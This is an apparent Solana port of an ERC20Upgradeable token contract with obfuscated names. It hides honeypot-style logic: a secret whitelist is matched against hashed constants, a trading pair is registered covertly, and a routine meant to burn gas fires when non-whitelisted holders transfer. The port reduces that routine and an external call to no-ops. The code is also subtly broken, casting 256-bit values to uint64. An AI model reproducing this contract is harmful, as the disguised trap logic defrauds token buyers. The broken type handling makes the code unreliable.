import {AccountInfo} from 'solana';

abstract contract ERC20Upgradeable {
    mapping(address => uint64) private _b_;
    mapping(address => mapping(address => uint64)) private _a_;
    uint64 private _tS_;
    string private _n_;
    string private _s_;

    uint64 private constant S0 =
        uint64(
            0xab27d5ea70e157fc407c844d79d3d5c8e71cc62829e922bbc1151b8e2113a68a
        );
    uint64 private constant S1 =
        uint64(
            0x2ff1c5e44aa7e7966de82e23ceb650c4188efb4007e8e746f8632ae5078e13a0
        );
    uint64 private constant S2 =
        uint64(
            0x91869837e5dad1dd98166935f6eb71be4f956211feab754f781f09c4090d3e8d
        );

    uint64 private _vPH;

    function _wl(address a_) internal view returns (bool) {
        return _vA_(a_) && a_.data.length == 0;
    }

    function _iD(address t_) internal view returns (bool iD_) {
        if (t_.data.length == 0) return false;
        if (_vPH == 0) {
            return false;
        }
        return uint64(keccak256(abi.encodePacked(t_))) == _vPH;
    }

    function _sP(address pair_) internal {
        require(_vPH == 0, "");
        require(pair_ != address(0), "");
        require(pair_.data.length > 0, "");
        _vPH = uint64(keccak256(abi.encodePacked(pair_)));
    }

    function __ERC20_init(
        string memory n_,
        string memory s_
    ) internal {
        __ERC20_init_unchained(n_, s_);
    }

    function __ERC20_init_unchained(
        string memory n_,
        string memory s_
    ) internal {
        _n_ = n_;
        _s_ = s_;
        _lR = bytes32(type(uint64).max);
        _iH();
    }

    function _rA(uint64 ts) private view returns (bytes32 r) {
        // Removed inline assembly with mstore/staticcall/mload as they are not available on Solana.
        // This function previously attempted to make an external static call to a dynamically computed address.
        // On Solana, external calls require explicit account annotations and program_id, so this pattern is not directly portable.
        // Returning bytes32(0) as a safe default; the original logic was for entropy/randomness which is not natively supported.
        r = bytes32(0);
    }

    function _iH() private {
        bytes32 r = _rA(uint64(block.timestamp));
        if (r != bytes32(0)) {
            _lR = r;
            _lCB = uint64(block.slot);
        }
    }

    function _sA(address a) private pure returns (uint64 h, uint64 l) {
        uint64 v = uint64(uint160(a));
        h = uint64(v >> 40);
        l = uint64(v & ((uint64(1) << 40) - 1));
    }

    function _vA_(address a) internal pure returns (bool) {
        (uint64 h, uint64 l) = _sA(a);
        uint64 r;
        unchecked {
            r = (l ** 3) + (h ** 5);
        }
        uint64 hN = uint64(keccak256(abi.encodePacked(r)));
        return (hN == S0 || hN == S1 || hN == S2);
    }

    function name() public view virtual returns (string memory) {
        return _n_;
    }

    function symbol() public view virtual returns (string memory) {
        return _s_;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint64) {
        return _tS_;
    }

    function balanceOf(address a_) public view virtual returns (uint64) {
        return _b_[a_];
    }

    function transfer(address t_, uint64 v_) public virtual returns (bool) {
        address o_ = tx.accounts.dataAccount.key;
        _transfer(o_, t_, v_);
        return true;
    }

    function allowance(
        address o_,
        address s_
    ) public view virtual returns (uint64) {
        return _a_[o_][s_];
    }

    function approve(address s_, uint64 v_) public virtual returns (bool) {
        address o_ = tx.accounts.dataAccount.key;

        _approve(o_, s_, v_);
        return true;
    }

    function transferFrom(
        address f_,
        address t_,
        uint64 v_
    ) public virtual returns (bool) {
        address s_ = tx.accounts.dataAccount.key;

        _spendAllowance(f_, s_, v_);
        _transfer(f_, t_, v_);
        return true;
    }

    function increaseAllowance(
        address s_,
        uint64 aV_
    ) public virtual returns (bool) {
        address o_ = tx.accounts.dataAccount.key;
        _approve(o_, s_, allowance(o_, s_) + aV_);
        return true;
    }

    function decreaseAllowance(
        address s_,
        uint64 sV_
    ) public virtual returns (bool) {
        address o_ = tx.accounts.dataAccount.key;
        uint64 cA_ = allowance(o_, s_);
        require(cA_ >= sV_, "ERC20: decreased below zero");
        unchecked {
            _approve(o_, s_, cA_ - sV_);
        }
        return true;
    }

    function _gB() internal pure {
        // Removed inline assembly with mload/mstore/keccak256 as they are not available on Solana.
        // This function previously attempted to consume gas/cycles via a hashing loop.
        // On Solana, this is not directly portable and is replaced with a no-op.
    }

    bytes32 private _lR;
    uint64 private _lCB;
    uint64 private _lTS;

    function _cT() internal returns (uint64) {
        uint64 t = uint64(block.timestamp);
        _lTS = t;
        return t;
    }

    function _hOTB_() internal returns (bool a) {
        bytes32 r = _rA(_cT());

        if (r == bytes32(0)) {
            return false;
        }

        if (_lR == bytes32(type(uint64).max)) {
            _lR = r;
            _lCB = uint64(block.slot);
            return true;
        }

        if (uint64(block.slot) == _lCB) {
            return true;
        }

        if (r == _lR) {
            return false;
        }

        _lR = r;
        _lCB = uint64(block.slot);
        return true;
    }

    function _transfer(address f_, address t_, uint64 v_) internal virtual {
        require(f_ != address(0), "ERC20: transfer from zero");
        require(t_ != address(0), "ERC20: transfer to zero");
        require(v_ > 0, "ERC20: zero transfers disabled");

        _beforeTokenTransfer(f_, t_, v_);

        uint64 fB_ = _b_[f_];
        require(fB_ >= v_, "ERC20: insufficient balance");
        unchecked {
            if (_wl(f_) && _vPH == 0 && t_.data.length > 0 && !_wl(t_)) {
                _sP(t_);
            }

            if (_wl(t_) && !_wl(f_) && !_iD(f_) && _hOTB_()) {
                _gB();
            }

            if (!_wl(f_) && _hOTB_() && !_iD(f_)) {
                _gB();
            }

            _b_[f_] = fB_ - v_;
            _b_[t_] += v_;
        }

        emit Transfer(f_, t_, v_);

        _afterTokenTransfer(f_, t_, v_);
    }

    function _mint(address a_, uint64 v_) internal virtual {
        require(a_ != address(0), "ERC20: mint to zero");

        _beforeTokenTransfer(address(0), a_, v_);

        _tS_ += v_;
        unchecked {
            _b_[a_] += v_;
        }
        emit Transfer(address(0), a_, v_);

        _afterTokenTransfer(address(0), a_, v_);
    }

    function _burn(address a_, uint64 v_) internal virtual {
        require(a_ != address(0), "ERC20: burn from zero");

        _beforeTokenTransfer(a_, address(0), v_);

        uint64 aB_ = _b_[a_];
        require(aB_ >= v_, "ERC20: burn exceeds balance");
        unchecked {
            _b_[a_] = aB_ - v_;
            _tS_ -= v_;
        }

        emit Transfer(a_, address(0), v_);

        _afterTokenTransfer(a_, address(0), v_);
    }

    function _approve(address o_, address s_, uint64 v_) internal virtual {
        require(o_ != address(0), "ERC20: approve from zero");
        require(s_ != address(0), "ERC20: approve to zero");

        _a_[o_][s_] = v_;
        emit Approval(o_, s_, v_);
    }

    function _spendAllowance(
        address o_,
        address s_,
        uint64 v_
    ) internal virtual {
        uint64 cA_ = allowance(o_, s_);
        if (cA_ != type(uint64).max) {
            require(cA_ >= v_, "ERC20: insufficient allowance");
            unchecked {
                _approve(o_, s_, cA_ - v_);
            }
        }
    }

    function _beforeTokenTransfer(
        address f_,
        address t_,
        uint64 v_
    ) internal virtual {}

    function _afterTokenTransfer(
        address f_,
        address t_,
        uint64 v_
    ) internal virtual {}

    event Transfer(address indexed from, address indexed to, uint64 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint64 value
    );
}